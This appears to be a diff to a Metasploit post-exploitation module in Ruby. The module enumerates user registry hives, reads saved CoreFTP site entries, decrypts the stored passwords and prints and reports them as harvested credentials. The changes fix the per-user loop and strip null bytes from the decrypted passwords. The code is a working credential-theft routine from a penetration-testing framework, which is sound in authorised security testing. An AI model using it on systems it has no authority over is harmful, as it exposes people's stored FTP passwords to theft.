@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Post
 				subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
 				if subkeys.nil? or subkeys.empty?
 					print_status ("CoreFTP not installed for this user.")
-					return
+					next
 				end
 
 				subkeys.each do |site|
@@ -55,6 +55,7 @@ class Metasploit3 < Msf::Post
 					epass = registry_getvaldata(site_key, "PW")
 					next if epass == nil or epass == ""
 					pass = decrypt(epass)
+					pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
 					print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
 					auth = 
 						{
@@ -65,7 +66,7 @@ class Metasploit3 < Msf::Post
 					report_auth_info(auth)
 				end
 			rescue
-				print_status("Not Installed for this User or Cannot Access User SID: #{hive['HKU']}")
+				print_status("Cannot Access User SID: #{hive['HKU']}")
 			end 
 		end
 		unload_our_hives(userhives)
